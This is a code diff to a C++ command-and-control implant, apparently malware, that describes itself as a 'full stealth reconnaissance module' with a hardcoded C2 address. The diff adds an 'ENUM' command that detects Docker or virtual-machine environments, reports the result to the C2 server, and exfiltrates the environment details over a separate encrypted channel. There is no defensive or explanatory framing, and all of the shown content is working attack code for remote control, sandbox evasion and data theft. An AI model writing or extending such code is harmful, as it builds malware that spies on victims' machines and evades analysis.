@@ -19,6 +19,7 @@
 
 // Full stealth reconnaissance module
 #include "recon.h"
+#include "docker_enum.h"
 
 #ifndef C2_IP
 #define C2_IP "10.37.1.249"
@@ -86,6 +87,11 @@ void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
         std::string recon_report = perform_full_recon();
         c2_response = "OK " + id;   // short ack to C2
         exfil_data = "=== FULL RECON REPORT ===\n" + recon_report + "\n=== END ===\n";
+    } else if (keyword == "ENUM") {
+        // Environment enumeration (Docker/VM detection)
+        DetectionResult result = run_environment_checks();
+        c2_response = (result.is_docker || result.is_vm) ? "ENV_VIRTUAL " + id : "ENV_PHYSICAL " + id;
+        exfil_data = "=== ENVIRONMENT ENUMERATION ===\n" + result.details + "\n=== END ===\n";
     } else {
         c2_response = "ERR " + id;
     }
